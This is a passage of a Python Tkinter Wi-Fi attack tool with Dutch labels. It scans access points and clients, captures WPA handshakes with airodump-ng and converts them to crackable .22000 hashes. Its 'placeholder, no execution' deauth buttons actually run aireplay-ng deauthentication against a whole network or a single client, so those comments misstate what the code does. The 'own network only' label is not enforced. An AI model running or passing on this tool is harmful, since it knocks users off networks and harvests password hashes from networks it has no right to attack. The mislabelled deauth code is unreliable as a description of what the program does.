            self.tree_ap = ttk.Treeview(left, columns=ap_cols, show="headings", height=18, selectmode="browse")
            for c, h, w in zip(ap_cols, ("BSSID","ESSID","CH","BAND","CLIENTS"), (22, 26, 6, 6, 8)):
                self.tree_ap.heading(c, text=h)
                self.tree_ap.column(c, width=w*8, anchor="w")
            self.tree_ap.pack(fill="both", expand=True, padx=6, pady=6)
            self.tree_ap.bind("<<TreeviewSelect>>", self._on_ap_select)

            # --- Rechterpaneel: Clients onder geselecteerde BSSID ---
            right = ttk.LabelFrame(root, text="Clients (onder geselecteerde BSSID)")
            right.pack(side="left", fill="both", expand=True, padx=(6,0))

            cl_cols = ("mac","last_seen")
            self.tree_cl = ttk.Treeview(right, columns=cl_cols, show="headings", height=18, selectmode="browse")
            for c, h, w in zip(cl_cols, ("CLIENT (Alias/MAC)","LAATST GEZIEN"), (36, 14)):
                self.tree_cl.heading(c, text=h)
                self.tree_cl.column(c, width=w*8, anchor="w")
            self.tree_cl.pack(fill="both", expand=True, padx=6, pady=6)
            self.tree_cl.bind("<<TreeviewSelect>>", self._on_client_select)
            self.tree_cl.bind("<Double-1>", self._on_alias_edit)

            # Contextmenu voor alias
            self.cm = tk.Menu(self.win, tearoff=0)
            self.cm.add_command(label="Naam geven…", command=self._alias_prompt)
            self.cm.add_command(label="Alias wissen", command=self._alias_clear)
            self.tree_cl.bind("<Button-3>", self._on_right_click)

            # --- Actierij ---
            btns = ttk.Frame(self.win); btns.pack(fill="x", padx=8, pady=(0,8))

            # Start/Stop monitoren (per BSSID)
            self.btn_start_mon = ttk.Button(btns, text="Start monitoren (BSSID)", command=self.start_monitor_selected_ap, state=tk.DISABLED)
            self.btn_start_mon.pack(side="left")

            self.btn_stop_mon = ttk.Button(btns, text="Stop monitoren", command=self.stop_monitoring, state=tk.DISABLED)
            self.btn_stop_mon.pack(side="left", padx=(8,0))

            # Deauth-UI (PLACEHOLDER, GEEN UITVOERING) — UNTOUCHED
            self.btn_bcast = ttk.Button(btns, text="Broadcast", command=self.deauth_broadcast, state=tk.DISABLED)
            self.btn_bcast.pack(side="left", padx=(16,0))
            self.btn_target = ttk.Button(btns, text="Gericht op client", command=self.deauth_selected_client, state=tk.DISABLED)
            self.btn_target.pack(side="left", padx=(8,0))

            ttk.Label(btns, text="Packets:").pack(side="left", padx=(16,4))
            self.spin_packets = ttk.Spinbox(btns, from_=1, to=128, width=5, command=self._on_packets_change)
            self.spin_packets.pack(side="left")
            self.spin_packets.delete(0, tk.END); self.spin_packets.insert(0, str(self.app.packets_var.get()))

            # Export clients
            ttk.Button(btns, text="Export CSV", command=self.export_clients).pack(side="left", padx=(16,6))
            ttk.Button(btns, text="Export JSON", command=self.export_clients_json).pack(side="left")

            # --- Hash-vak ---
            boxhash = ttk.LabelFrame(self.win, text=".22000 output (alleen eigen netwerk)")
            boxhash.pack(fill="both", expand=False, padx=8, pady=(8,8))
            self.hash_text = tk.Text(boxhash, height=8, width=130, font=("TkFixedFont", 9))
            self.hash_text.pack(fill="both", expand=True, padx=6, pady=6)

            actions = ttk.Frame(boxhash); actions.pack(fill="x", padx=6, pady=(0,6))
            self.btn_copy_hash = ttk.Button(actions, text="Copy hash", command=self.copy_hash)
            self.btn_copy_hash.pack(side="right")
            self.btn_open_hash_dir = ttk.Button(actions, text="Open map", command=self.open_hash_dir)
            self.btn_open_hash_dir.pack(side="right", padx=(0,6))

            # Statusrij (countdown + eapol)
            tools = ttk.Frame(self.win); tools.pack(fill="x", padx=8, pady=(0,8))
            self.lbl_count = ttk.Label(tools, text="⏳ —")
            self.lbl_count.pack(side="left")
            self.lbl_eapol = ttk.Label(tools, text="EAPOL: nee")
            self.lbl_eapol.pack(side="left", padx=(10,0))

            # Run-state voor handmatige monitoring
            self.mon_thread = None
            self.mon_stop   = None
            self.mon_bssid  = None

            # Laatste hash-pad
            self.last_hash_path = None

            # Tick-id (voor cancel bij sluiten)
            self._tick_id = None

            # Init data
            self.refresh_aps()

        # ---------- UI helpers ----------
        def _safe_set_count(self, text: str):
            try:
                if getattr(self, "lbl_count", None) is not None and self.lbl_count.winfo_exists():
                    self.lbl_count.config(text=text)
            except Exception:
                pass

        def _safe_set_eapol(self, flag: bool):
            try:
                if getattr(self, "lbl_eapol", None) is not None and self.lbl_eapol.winfo_exists():
                    self.lbl_eapol.config(text=("EAPOL: ja" if flag else "EAPOL: nee"))
            except Exception:
                pass

        def _on_packets_change(self):
            try:
                val = int(self.spin_packets.get())
                if 1 <= val <= 128:
                    self.app.packets_var.set(val)
            except Exception:
                pass

        def _on_ap_select(self, _evt):
            sel = self.tree_ap.selection()
            if not sel:
                self.refresh_clients_for_ap(None)
            else:
                bssid = sel[0]
                self.refresh_clients_for_ap(bssid)
            self._update_buttons_state()

        def _on_client_select(self, _evt):
            self._update_buttons_state()

        def _on_right_click(self, event):
            row = self.tree_cl.identify_row(event.y)
            if row:
                self.tree_cl.selection_set(row)
                self.cm.tk_popup(event.x_root, event.y_root)

        def _on_alias_edit(self, _evt):
            self._alias_prompt()

        def _alias_prompt(self):
            sel = self.tree_cl.selection()
            if len(sel) != 1: return
            rid = sel[0]  # "MAC__BSSID"
            mac, _ = rid.split("__", 1)
            cur = self.app.aliases.get(mac.lower(), "")
            name = simpledialog.askstring("Naam geven", f"Naam voor {mac}:", initialvalue=cur, parent=self.win)
            if name is None:  # cancel
                return
            self.app.set_alias(mac, name)
            self.refresh_clients_for_selected()

        def _alias_clear(self):
            sel = self.tree_cl.selection()
            if len(sel) != 1: return
            rid = sel[0]
            mac, _ = rid.split("__", 1)
            self.app.set_alias(mac, "")
            self.refresh_clients_for_selected()

        def refresh_clients_for_selected(self):
            sel = self.tree_ap.selection()
            self.refresh_clients_for_ap(sel[0] if sel else None)

        def _update_buttons_state(self):
            ap_sel = bool(self.tree_ap.selection())
            cl_sel = bool(self.tree_cl.selection())
            running = self.mon_thread is not None and self.mon_thread.is_alive()

            self.btn_start_mon.config(state=(tk.NORMAL if (ap_sel and not running) else tk.DISABLED))
            self.btn_stop_mon.config(state=(tk.NORMAL if running else tk.DISABLED))
            self.btn_bcast.config(state=(tk.NORMAL if ap_sel else tk.DISABLED))
            self.btn_target.config(state=(tk.NORMAL if cl_sel else tk.DISABLED))

        # ---------- Data renders ----------
        def refresh_aps(self):
            for i in self.tree_ap.get_children(): self.tree_ap.delete(i)
            for bssid, meta in sorted(self.app.bssids.items()):
                ch = meta.get("channel","?")
                ess = meta.get("essid","?")
                band = meta.get("band","?")
                clients = self.app.client_counts.get(bssid, 0)
                self.tree_ap.insert("", "end", iid=bssid, values=(bssid, ess, str(ch), band))
                self.tree_ap.set(bssid, "clients", str(clients))
            self._update_buttons_state()
            sel = self.tree_ap.selection()
            self.refresh_clients_for_ap(sel[0] if sel else None)

        def refresh_clients_for_ap(self, bssid):
            for i in self.tree_cl.get_children(): self.tree_cl.delete(i)
            if not bssid:
                self._update_buttons_state()
                return
            for (b, mac), info in self.app.all_clients.items():
                if b == bssid:
                    alias = self.app.alias_for(mac)
                    self.tree_cl.insert("", "end", iid=f"{mac}__{bssid}",
                                        values=(alias, info.get("last_seen","")))
            self._update_buttons_state()

        def update_row_from_client(self, info: dict):
            # update clients count in AP tree
            clients = self.app.client_counts.get(info["bssid"], 0)
            if self.tree_ap.exists(info["bssid"]):
                try:
                    self.tree_ap.set(info["bssid"], "clients", str(clients))
                except Exception:
                    pass
            sel = self.tree_ap.selection()
            if sel and sel[0] == info["bssid"]:
                rid = f'{info["mac"]}__{info["bssid"]}'
                vals = (self.app.alias_for(info["mac"]), info.get("last_seen",""))
                if self.tree_cl.exists(rid):
                    self.tree_cl.item(rid, values=vals)
                else:
                    self.tree_cl.insert("", "end", iid=rid, values=vals)

        # ---------- Export clients ----------
        def export_clients(self):
            try:
                os.makedirs(self.app.logdir or "logs", exist_ok=True)
                path = os.path.join(self.app.logdir or "logs", "clients.csv")
                with open(path, "w", encoding="utf-8", newline="") as f:
                    w = csv.writer(f)
                    w.writerow(["BSSID","ESSID","Channel","Client MAC","Alias","Last Seen"])
                    for (bssid, mac), info in sorted(self.app.all_clients.items()):
                        alias = self.app.aliases.get(mac.lower(), "")
                        w.writerow([bssid, info.get("essid",""), info.get("channel",""),
                                    mac, alias, info.get("last_seen","")])
                messagebox.showinfo("Export", f"Opgeslagen:\n{path}")
            except Exception as e:
                messagebox.showerror("Export", f"Mislukt: {e}")

        def export_clients_json(self):
            try:
                os.makedirs(self.app.logdir or "logs", exist_ok=True)
                path = os.path.join(self.app.logdir or "logs", "clients.json")
                bundle = []
                for (bssid, mac), info in sorted(self.app.all_clients.items()):
                    alias = self.app.aliases.get(mac.lower(), "")
                    rec = {
                        "bssid": bssid,
                        "essid": info.get("essid",""),
                        "channel": info.get("channel",""),
                        "mac": mac,
                        "alias": alias,
                        "last_seen": info.get("last_seen","")
                    }
                    bundle.append(rec)
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(bundle, f, ensure_ascii=False, indent=2)
                messagebox.showinfo("Export", f"Opgeslagen:\n{path}")
            except Exception as e:
                messagebox.showerror("Export", f"Mislukt: {e}")

        # ---------- Start/Stop monitoren ----------
        def start_monitor_selected_ap(self):
            sel = self.tree_ap.selection()
            if len(sel) != 1:
                messagebox.showerror("Selectie", "Kies precies één BSSID (AP).")
                return
            bssid = sel[0]
            meta = self.app.bssids.get(bssid) or {}
            channel = meta.get("channel")
            essid   = meta.get("essid","")

            if channel in (None, "?", "", "-1"):
                messagebox.showwarning("Kanaal onbekend", f"Geen geldig kanaal voor {bssid}.")
                return
            if not self.app.current_mon:
                messagebox.showwarning("Monitor", "Monitor-interface nog niet actief.")
                return
            if self.mon_thread is not None and self.mon_thread.is_alive():
                messagebox.showinfo("Bezig", "Er draait al monitoring. Stop die eerst.")
                return

            self.mon_stop  = threading.Event()
            self.mon_bssid = bssid
            self.mon_thread = threading.Thread(
                target=self._capture_and_convert,
                args=(bssid, channel, essid),
                kwargs={"wait_seconds": None, "stop_event": self.mon_stop},
                daemon=True
            )
            self.mon_thread.start()
            self.app.log(f"Monitoring gestart voor {bssid} (ch {channel})", "basic")
            self._update_buttons_state()

        def stop_monitoring(self):
            if self.mon_thread is None or not self.mon_thread.is_alive():
                self.app.log("Geen actieve monitoring om te stoppen.", "basic")
                return
            try:
                if self.mon_stop:
                    self.mon_stop.set()
                self.app.log(f"Stop-signaal gestuurd voor monitoring ({self.mon_bssid or ''}).", "basic")
            finally:
                self._update_buttons_state()

        # ---------- Passieve handshake (robuust) ----------
        def _capture_and_convert(self, bssid, channel, essid, wait_seconds=120, stop_event=None):
            self.app.log(f"Handshake monitor (passief) voor {bssid} ch {channel}", "basic")
            os.makedirs(self.app.logdir or "logs", exist_ok=True)
            safe = safe_prefix(f"{essid}_hs_{bssid.replace(':','')}")
            prefix = os.path.join(self.app.logdir or "logs", safe)

            # Ruim eerdere output op
            for suf in ("-01.csv","-01.cap","-02.cap","-03.cap","-01.kismet.csv","-01.kismet.netxml",".22000"):
                try: os.remove(prefix + suf)
                except FileNotFoundError: pass
                except Exception: pass

            if channel in (None, "?", "", "-1"):
                self.app.log(f"Onbekend kanaal voor {bssid}; stop capture.", "basic")
                return

            # kanaal/freq pin
            self.app._set_channel_or_freq(self.app.current_mon, channel)
            time.sleep(0.15)

            cmd = ["airodump-ng","--bssid", bssid, "--channel", str(channel),
                   "--write", prefix, "--output-format","pcap,csv", self.app.current_mon]
            proc = None
            try:
                proc = self.app._spawn(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                out22000 = prefix + ".22000"
                handshake_logged = False
                last_out = time.time()
                watchdog = self.app.watchdog_secs

                # countdown
                deadline = None if wait_seconds is None else (time.time() + max(10, int(wait_seconds)))

                def tick():
                    if deadline is None:
                        self._safe_set_count("⏳ loopt…")
                    else:
                        remain = int(max(0, deadline - time.time()))
                        self._safe_set_count(f"⏳ {remain}s")
                    alive = proc and (proc.poll() is None)
                    notstopped = (stop_event is None) or (not stop_event.is_set())
                    win_ok = hasattr(self, "win") and self.win.winfo_exists()
                    if alive and notstopped and win_ok:
                        self._tick_id = self.app.master.after(1000, tick)

                self._tick_id = self.app.master.after(0, tick)

                def time_ok():
                    return True if deadline is None else (time.time() < deadline)
                def not_stopped():
                    return (stop_event is None) or (not stop_event.is_set())

                def find_newest_cap():
                    candidates = []
                    for p in glob.glob(prefix + "-*.cap"):
                        try:
                            m = os.path.getmtime(p)
                            candidates.append((m, p))
                        except FileNotFoundError:
                            continue
                        except Exception:
                            continue
                    if not candidates:
                        return None
                    candidates.sort(key=lambda t: t[0], reverse=True)
                    return candidates[0][1]

                while not_stopped() and time_ok():
                    try:
                        if proc.stdout:
                            line = proc.stdout.readline()
                            if line and line.strip():
                                ln = clean_text(line.strip())
                                self.app.log(ln, "debug")
                                last_out = time.time()
                                if (not handshake_logged) and ("WPA handshake" in ln or "EAPOL" in ln.upper()):
                                    self.app.log(f"Signaal in stdout: mogelijk handshake ({ln})", "verbose")
                                    handshake_logged = True
                                    self._safe_set_eapol(True)
                    except Exception:
                        pass

                    # Watchdog
                    if proc and proc.poll() is None and (time.time() - last_out) > watchdog:
                        self.app.log("Handshake watchdog: geen output, herstart airodump…", "basic")
                        try:
                            proc.terminate()
                        except Exception:
                            pass
                        proc = self.app._spawn(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                        last_out = time.time()

                    newest_cap = find_newest_cap()
                    if newest_cap and os.path.getsize(newest_cap) > 0:
                        try:
                            conv = subprocess.run(
                                ["hcxpcapngtool","-o", out22000, newest_cap],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=15
                            )
                            if conv.stdout:
                                for l in conv.stdout.splitlines():
                                    if "EAPOL" in l.upper():
                                        self._safe_set_eapol(True)
                                    self.app.log(f"hcxpcapngtool: {clean_text(l)}", "debug")
                            if os.path.exists(out22000) and os.path.getsize(out22000) > 0:
                                with open(out22000, "r", encoding="utf-8", errors="ignore") as f:
                                    lines = [ln.strip() for ln in f if ln.strip()]
                                self.app.master.after(0, lambda: self._show_hash(lines[:10], out22000))
                                self.app.log(f"Handshake gedetecteerd. Bestand opgeslagen als: {out22000}", "basic")
                                notify_user("Handshake gedetecteerd", os.path.basename(out22000))
                                if stop_event is None:
                                    break
                        except Exception as e:
                            self.app.log(f"hcxpcapngtool error: {e}", "debug")

                    time.sleep(0.6)

                # Final conversion (ook bij stoppen/tijd op)
                newest_cap = None
                candidates = []
                for p in glob.glob(prefix + "-*.cap"):
                    try:
                        candidates.append((os.path.getmtime(p), p))
                    except FileNotFoundError:
                        continue
                    except Exception:
                        continue
                if candidates:
                    candidates.sort(key=lambda t: t[0], reverse=True)
                    newest_cap = candidates[0][1]

                if newest_cap and os.path.getsize(newest_cap) > 0:
                    try:
                        conv = subprocess.run(
                            ["hcxpcapngtool","-o", out22000, newest_cap],
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=20
                        )
                        if conv.stdout:
                            for l in conv.stdout.splitlines():
                                if "EAPOL" in l.upper():
                                    self._safe_set_eapol(True)
                                self.app.log(f"hcxpcapngtool(final): {clean_text(l)}", "debug")
                        if os.path.exists(out22000) and os.path.getsize(out22000) > 0:
                            with open(out22000, "r", encoding="utf-8", errors="ignore") as f:
                                lines = [ln.strip() for ln in f if ln.strip()]
                            self.app.master.after(0, lambda: self._show_hash(lines[:10], out22000))
                            self.app.log(f"Handshake gedetecteerd (final). Bestand opgeslagen als: {out22000}", "basic")
                            notify_user("Handshake gedetecteerd (final)", os.path.basename(out22000))
                        else:
                            self.app.log("Final conversion: geen bruikbare .22000.", "basic")
                    except Exception as e:
                        self.app.log(f"hcxpcapngtool(final) error: {e}", "debug")
                else:
                    self.app.log("Geen .cap gevonden of leeg; niets te converteren.", "basic")

            finally:
                # cancel terugkerende tick
                try:
                    if getattr(self, "_tick_id", None) is not None:
                        self.app.master.after_cancel(self._tick_id)
                except Exception:
                    pass
                self._tick_id = None

                try:
                    if proc and proc.poll() is None:
                        proc.terminate()
                except Exception:
                    pass
                # reset UI
                self.mon_bssid = None
                self.mon_stop  = None
                self.mon_thread = None
                try:
                    self._safe_set_count("⏳ —")
                except Exception:
                    pass
                self.app.master.after(0, self._update_buttons_state)
                self.app.log("Monitoring gestopt.", "basic")

        def _show_hash(self, lines, path):
            self.hash_text.delete("1.0", tk.END)
            self.hash_text.insert(tk.END, f"# {os.path.basename(path)}\n")
            for ln in lines:
                self.hash_text.insert(tk.END, ln + "\n")
            self.hash_text.see(tk.END)
            self.last_hash_path = path

        def copy_hash(self):
            data = self.hash_text.get("1.0", tk.END).strip()
            if not data:
                messagebox.showinfo("Copy", "Geen hash om te kopiëren.")
                return
            self.win.clipboard_clear()
            self.win.clipboard_append(data)
            self.app.log("Hash naar clipboard gekopieerd.", "basic")
            # auto-clear is verwijderd

        def open_hash_dir(self):
            if not self.last_hash_path:
                messagebox.showinfo("Open map", "Nog geen .22000 weergegeven.")
                return
            folder = os.path.dirname(self.last_hash_path)
            ok, err = open_folder(folder)
            if not ok:
                messagebox.showerror("Open map", f"Kon map niet openen:\n{err}")

        # ---------- Deauth-knoppen (PLACEHOLDERS; GEEN UITVOERING) ----------
        # ------------------------ UNTOUCHED ---------------------------
        def deauth_broadcast(self):
            sel = self.tree_ap.selection()
            if len(sel) != 1:
                messagebox.showerror("Selectie", "Kies precies één BSSID (AP) voor broadcast.")
                return
            # start geen tweede capture als er al één loopt
            if self.mon_thread is not None and self.mon_thread.is_alive():
                self.app.log("Er draait al monitoring; broadcast start geen tweede capture.", "basic")
                return

            bssid = sel[0]
            meta = self.app.bssids.get(bssid) or {}
            channel = meta.get("channel")
            essid   = meta.get("essid","")
            iface   = self.app.current_mon
            packets = int(self.app.packets_var.get() or 5)

            if channel in (None, "?", "", "-1") or not iface:
                messagebox.showwarning("Kanaal/iface", "Kanaal of monitor-interface ontbreekt.")
                return

            # HIER LEEG: hier zou in je eigen lab de subprocess-call komen (broadcast)
            subprocess.run(["aireplay-ng","--deauth", str(packets), "-a", bssid, iface])

            # Start meteen passieve handshake-capture
            threading.Thread(
                target=self._capture_and_convert,
                args=(bssid, channel, essid),
                daemon=True
            ).start()

        def deauth_selected_client(self):
            sel = self.tree_cl.selection()
            if len(sel) != 1:
                messagebox.showerror("Selectie", "Kies precies één client (MAC).")
                return
            # start geen tweede capture als er al één loopt
            if self.mon_thread is not None and self.mon_thread.is_alive():
                self.app.log("Er draait al monitoring; gericht start geen tweede capture.", "basic")
                return

            rid = sel[0]                 # "MAC__BSSID"
            mac, bssid = rid.split("__", 1)

            meta = self.app.bssids.get(bssid) or {}
            channel = meta.get("channel")
            essid   = meta.get("essid","")
            iface   = self.app.current_mon
            packets = int(self.app.packets_var.get() or 5)

            if channel in (None, "?", "", "-1") or not iface:
                messagebox.showwarning("Kanaal/iface", "Kanaal of monitor-interface ontbreekt.")
                return

            # HIER LEEG: hier zou in je eigen lab de subprocess-call komen (gericht)
            subprocess.run(["aireplay-ng","--deauth", str(packets), "-a", bssid, "-c", mac, iface])

            # Start meteen passieve handshake-capture
            threading.Thread(
                target=self._capture_and_convert,
                args=(bssid, channel, essid),
                daemon=True
            ).start()
        # ---------------------- END UNTOUCHED PART -------------------------

    # ---------------- Theming ----------------
    def _apply_theme(self):
        dark = bool(getattr(self, "dark_var", tk.BooleanVar(value=False)).get())
        try:
            style = ttk.Style()
            if dark:
                if "clam" in style.theme_names():
                    style.theme_use("clam")
                self.output_text.configure(bg="#111111", fg="#e6e6e6", insertbackground="#e6e6e6")
            else:
                # herstel naar origineel thema indien bekend
                if getattr(self, "_orig_theme", None) and self._orig_theme in style.theme_names():
                    style.theme_use(self._orig_theme)
                self.output_text.configure(
                    bg="SystemWindow" if sys.platform.startswith("win") else "white",
                    fg="black",
                    insertbackground="black"
                )
        except Exception:
            pass

    # ---------------- Self-test ----------------
    def open_selftest(self):
        win = tk.Toplevel(self.master)
        win.title("Self-test & Capabilities")
        win.geometry("980x620")
        txt = tk.Text(win, font=("TkFixedFont", 9), wrap="none")
        txt.pack(fill="both", expand=True, padx=8, pady=8)

        def add(title, cmd):
            txt.insert(tk.END, f"\n=== {title} ===\n")
            try:
                p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=10)
                txt.insert(tk.END, (p.stdout or "").strip() + "\n")
            except Exception as e:
                txt.insert(tk.END, f"[error] {e}\n")

        add("which airodump-ng", ["which","airodump-ng"])
        add("which iw", ["which","iw"])
        add("iw dev", ["iw","dev"])
        add("iw list (capabilities)", ["iw","list"])
        add("ip link show", ["ip","link","show"])
        add("airmon-ng --help (head)", ["airmon-ng","--help"])

        txt.insert(tk.END, "\nKlaar.\n")
        txt.see(tk.END)

# ---------------- Signal handlers ----------------
def _install_signal_handlers(app: WifiAutoTool):
    def handler(_signum, _frame):
        try:
            app.master.after(0, app.kill_all)
        except Exception:
            pass
    try:
        signal.signal(signal.SIGINT, handler)
        signal.signal(signal.SIGTERM, handler)
    except Exception:
        pass

if __name__ == "__main__":
    root = tk.Tk()
    # optioneel: modern ttk theme op sommige systemen
    try:
        style = ttk.Style()
        if "clam" in style.theme_names():
            style.theme_use("clam")
    except Exception:
        pass
    app = WifiAutoTool(root)
    _install_signal_handlers(app)
    root.mainloop()
